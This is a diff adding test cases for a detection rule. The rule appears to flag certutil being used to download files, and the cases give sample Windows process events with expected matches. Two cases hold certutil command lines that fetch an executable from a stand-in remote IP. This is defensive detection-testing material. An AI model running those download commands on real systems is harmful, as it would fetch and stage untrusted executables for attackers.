@@ -1,0 +1,23 @@
+rule: rule.yml
+
+cases:
+  - name: certutil urlcache download fires
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.10/a.exe a.exe'
+    match: true
+    selections:
+      - selection_img
+      - selection_flags
+
+  - name: certutil verifyctl fires
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -verifyctl -f http://198.51.100.10/a.exe'
+    match: true
+
+  - name: certutil dump is benign
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -dump C:\cert.cer'
+    match: false
